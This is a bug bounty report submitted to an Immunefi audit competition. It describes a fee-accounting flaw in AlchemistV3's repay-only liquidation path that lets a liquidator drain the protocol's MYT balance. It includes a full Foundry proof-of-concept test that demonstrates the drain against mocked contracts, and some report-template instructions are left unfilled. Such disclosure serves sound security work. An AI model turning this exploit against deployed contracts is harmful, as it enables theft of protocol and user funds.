# 57441 sc critical repay only fee drain in alchemistv3

**Submitted on Oct 26th 2025 at 09:20:18 UTC by @KiLl3rX for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57441
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

A vulnerability in the AlchemistV3 contract enables an external liquidator to exploit the payment-only path during a liquidation, causing a depletion of the protocol's funds. If exploited on the mainnet, the liquidator could receive more funds than the target by depleting the protocol's MYT balance. This issue occurs because the payment-only path allows the liquidator to receive the full theoretical payment fee, not the actual fee deducted from the user's collateral, with the difference being covered by the protocol itself.

## Vulnerability Details

Offer a detailed explanation of the vulnerability itself. Do not leave out any relevant information. Code snippets should be supplied whenever helpful, as long as they don’t overcrowd the report with unnecessary details. This section should make it obvious that you understand exactly what you’re talking about, and more importantly, it should be clear by this point that the vulnerability does exist.

\##Details

In the AlchemistV3 contract, specifically in the liquidate() function and the \_resolveRepaymentFee() helper function, the repayment fee is calculated based on the theoretical value but deducted based on the available collateral. The issue arises because \_resolveRepaymentFee() returns the theoretical fee rather than the actual fee that has been deducted from the collateral. This allows the liquidator to receive the full theoretical fee, with the difference being drained from the protocol's MYT balance. Below are the relevant code snippets:

```
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield)
    internal
    returns (uint256 fee)
{
    Account storage account = _accounts[accountId];
    fee = repaidAmountInYield * repaymentFee / BPS;

    account.collateralBalance -= fee > account.collateralBalance
        ? account.collateralBalance
        : fee;

    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee; // This is the theoretical fee, not the actual deducted amount
}
```

And in the liquidate() function:

```
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield); // Pays the full theoretical fee
```

In the repay-only path, this mismatch between the theoretical and actual fee results in the protocol losing funds when the liquidator is paid the full fee, regardless of the collateral available.

## Impact Details

Provide a detailed breakdown of possible losses from an exploit, especially if there are funds at risk. This illustrates the severity of the vulnerability, but it also provides the best possible case for you to be paid the correct amount. Make sure the selected impact is within the program’s list of in-scope impacts and matches the impact you selected.

## Proof of Concept

## Proof of Concept

forge test --match-path test/poc.t.sol -vvv

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {AlchemistV3} from "../src/AlchemistV3.sol";
import {AlchemistInitializationParams, IAlchemistV3} from "../src/interfaces/IAlchemistV3.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";

/* ---------- Minimal ERC1967 Proxy ---------- */
contract SimpleERC1967Proxy {
    bytes32 private constant _IMPL_SLOT =
        0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC;
    constructor(address logic, bytes memory initData) payable {
        assembly { sstore(_IMPL_SLOT, logic) }
        if (initData.length != 0) {
            (bool ok, bytes memory ret) = logic.delegatecall(initData);
            require(ok, string(ret));
        }
    }
    fallback() external payable {
        assembly {
            let impl := sload(_IMPL_SLOT)
            calldatacopy(0, 0, calldatasize())
            let r := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch r
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    receive() external payable {}
}

/* ---------- Simple Mocks ---------- */
contract MockVaultV2 is ERC20Mock {
    address public immutable _asset;
    constructor(string memory n, string memory s, address asset_)
        ERC20Mock(n, s)
    { _asset = asset_; }
    function asset() external view returns (address) { return _asset; }
    function convertToAssets(uint256 s) external pure returns (uint256) { return s; }
    function convertToShares(uint256 a) external pure returns (uint256) { return a; }
}

contract MockTransmuter {
    uint256 public queryGraphReturn;
    function totalLocked() external pure returns (uint256) { return 0; }
    function setQueryGraphReturn(uint256 v) external { queryGraphReturn = v; }
    function queryGraph(uint256, uint256) external view returns (uint256) { return queryGraphReturn; }
}

interface IERC721Lite { function ownerOf(uint256 id) external view returns (address); }
contract MockPosition is IERC721Lite {
    uint256 public nextId = 1;
    mapping(uint256 => address) public override ownerOf;
    event Minted(address indexed to, uint256 indexed id);
    function mint(address to) external returns (uint256 id) {
        id = nextId++; ownerOf[id] = to; emit Minted(to, id);
    }
}

/* ---------- PoC (fixed with vm.roll) ---------- */
contract AlchemistV3_FeeDrain_RepayOnly is Test {
    address admin;
    address user;
    address liq;

    ERC20Mock underlying;
    ERC20Mock debt;
    MockVaultV2 myt;
    MockTransmuter trans;
    MockPosition pos;
    AlchemistV3 alch;

    uint256 constant ONE = 1e18;

    function setUp() public {
        admin = address(this);
        user  = makeAddr("user");
        liq   = makeAddr("liq");

        vm.label(admin, "ADMIN");
        vm.label(user,  "USER");
        vm.label(liq,   "LIQ");

        underlying = new ERC20Mock("UND","UND");
        debt       = new ERC20Mock("AL","AL");
        myt        = new MockVaultV2("MYT","MYT", address(underlying));
        trans      = new MockTransmuter();
        pos        = new MockPosition();

        vm.label(address(underlying), "UND");
        vm.label(address(debt),       "AL");
        vm.label(address(myt),        "MYT");
        vm.label(address(trans),      "TRANSMUTER");
        vm.label(address(pos),        "POSITION_NFT");

        AlchemistV3 impl = new AlchemistV3();

        AlchemistInitializationParams memory p;
        p.admin                          = admin;
        p.debtToken                      = address(debt);
        p.underlyingToken                = address(underlying);
        p.depositCap                     = 1_000_000 * ONE;
        p.minimumCollateralization       = 1.5e18;    // 150% (allow mint)
        p.globalMinimumCollateralization = 1.5e18;
        p.collateralizationLowerBound    = 1.2e18;    // 120%
        p.transmuter                     = address(trans);
        p.protocolFeeReceiver            = admin;
        p.protocolFee                    = 0;
        p.liquidatorFee                  = 0;         // base fee off for this PoC
        p.repaymentFee                   = 0;         // set later in test
        p.myt                            = address(myt);

        bytes memory init = abi.encodeWithSelector(AlchemistV3.initialize.selector, p);
        SimpleERC1967Proxy proxy = new SimpleERC1967Proxy(address(impl), init);
        alch = AlchemistV3(payable(address(proxy)));
        vm.label(address(alch), "ALCHEMISTV3_PROXY");

        console2.log("[Init]");
        logGlobal();

        alch.setAlchemistPositionNFT(address(pos));
        console2.log("[setAlchemistPositionNFT]");
        logGlobal();

        myt.mint(user, 100*ONE);
        myt.mint(liq,  100*ONE);
        vm.prank(user); myt.approve(address(alch), type(uint256).max);
        vm.prank(liq);  myt.approve(address(alch), type(uint256).max);

        console2.log("[seed] user MYT");
        console2.logUint(myt.balanceOf(user));
        console2.log("[seed] liq MYT");
        console2.logUint(myt.balanceOf(liq));
    }

    function test_RepayOnly_FeeDrain() public {
        // 1) repaymentFee = 100%
        vm.prank(admin);
        alch.setRepaymentFee(10_000);
        console2.log("[setRepaymentFee 100%]");
        logGlobal();

        // 2) deposit 1 and mint 0.6 (allowed at 150%)
        vm.prank(user);
        alch.deposit(1*ONE, user, 0); // tokenId=1
        console2.log("[deposit 1]");
        logCDP(1);

        vm.prank(user);
        alch.mint(1, uint256(6e17), user); // debt=0.6
        console2.log("[mint debt 0.6]");
        logCDP(1);
        logGlobal();

        // 3) raise thresholds after mint so account is under LB
        vm.startPrank(admin);
        alch.setMinimumCollateralization(1.8e18);     // 180%
        alch.setCollateralizationLowerBound(1.7e18);  // 170%
        vm.stopPrank();
        console2.log("[raise thresholds]");
        logGlobal();
        logCDP(1);

        // 4) ensure earmark grows: MUST roll blocks (not just warp)
        vm.prank(admin);
        trans.setQueryGraphReturn(type(uint256).max);

        console2.log("[earmark loop start]");
        for (uint256 i = 0; i < 96; i++) {
            vm.roll(block.number + 1);   // <<<<<< key fix: bump block.number
            alch.poke(1);                // _earmark() + _sync(1)

            (uint256 coll_, uint256 debtNow_, uint256 earmNow_) =
                IAlchemistV3(address(alch)).getCDP(1);

            console2.log("POKE");              console2.logUint(i);
            console2.log("block");             console2.logUint(block.number);
            console2.log("debt");              console2.logUint(debtNow_);
            console2.log("earmarked");         console2.logUint(earmNow_);
            console2.log("totalDebt");         console2.logUint(alch.totalDebt());
            console2.log("cumulativeEarmarked");console2.logUint(alch.cumulativeEarmarked());

            if (debtNow_ > 0 && earmNow_ >= debtNow_) {
                console2.log("earmark condition met");
                break;
            }
        }
        ( , uint256 d1, uint256 e1) = IAlchemistV3(address(alch)).getCDP(1);
        console2.log("[earmark end] debt");      console2.logUint(d1);
        console2.log("[earmark end] earmarked"); console2.logUint(e1);
        require(d1 > 0, "no debt to repay");
        require(e1 >= d1, "earmark did not fully cover debt");

        // 5) cushion for (repay + fee)
        myt.mint(address(alch), 1*ONE);
        console2.log("[cushion] contract MYT");
        console2.logUint(myt.balanceOf(address(alch)));

        uint256 protoBefore = myt.balanceOf(address(alch));
        uint256 liqBefore   = myt.balanceOf(liq);
        uint256 transBefore = myt.balanceOf(address(trans));
        console2.log("[pre-liquidate] proto"); console2.logUint(protoBefore);
        console2.log("[pre-liquidate] liq");   console2.logUint(liqBefore);
        console2.log("[pre-liquidate] trans"); console2.logUint(transBefore);

        // 6) liquidate -> Repay-Only -> repaymentFee paid to liq
        vm.prank(liq);
        (uint256 amt, uint256 feeYield, uint256 feeUnd) = alch.liquidate(1);
        console2.log("[liquidate] amt");       console2.logUint(amt);
        console2.log("[liquidate] feeYield");  console2.logUint(feeYield);
        console2.log("[liquidate] feeUnd");    console2.logUint(feeUnd);

        ( , uint256 d2, uint256 e2) = IAlchemistV3(address(alch)).getCDP(1);
        console2.log("[post-liquidate debt]");      console2.logUint(d2);
        console2.log("[post-liquidate earmarked]"); console2.logUint(e2);

        uint256 protoAfter = myt.balanceOf(address(alch));
        uint256 liqAfter   = myt.balanceOf(liq);
        uint256 transAfter = myt.balanceOf(address(trans));
        console2.log("[post-liquidate proto]"); console2.logUint(protoAfter);
        console2.log("[post-liquidate liq]");   console2.logUint(liqAfter);
        console2.log("[post-liquidate trans]"); console2.logUint(transAfter);

        assertGt(amt, 0, "no repay executed");
        assertEq(feeUnd, 0, "unexpected underlying fee");
        assertGt(feeYield, 0, "no repayment fee paid");
        assertEq(liqAfter - liqBefore, feeYield, "liq fee mismatch");
        assertEq(transAfter - transBefore, amt, "transmuter repay mismatch");
        assertEq(protoBefore - protoAfter, amt + feeYield, "protocol funding mismatch");
        assertEq(d2, 0, "debt not zero after repay-only");

        console2.log("[OK] Repay-Only drain proven");
    }

    /* ---------------- helpers ---------------- */
    function logGlobal() internal view {
        console2.log("block");              console2.logUint(block.number);
        console2.log("totalDebt");          console2.logUint(alch.totalDebt());
        console2.log("totalSynthetics");    console2.logUint(alch.totalSyntheticsIssued());
        console2.log("cumulativeEarmarked");console2.logUint(alch.cumulativeEarmarked());
        console2.log("minCol");             console2.logUint(alch.minimumCollateralization());
        console2.log("lowerBound");         console2.logUint(alch.collateralizationLowerBound());
        console2.log("depositCap");         console2.logUint(alch.depositCap());
        console2.log("repaymentFeeBps");    console2.logUint(alch.repaymentFee());
    }

    function logCDP(uint256 tokenId) internal view {
        (uint256 coll, uint256 debtNow, uint256 earm) = IAlchemistV3(address(alch)).getCDP(tokenId);
        console2.log("CDP.collateral"); console2.logUint(coll);
        console2.log("CDP.debt");       console2.logUint(debtNow);
        console2.log("CDP.earmarked");  console2.logUint(earm);
    }
}
```
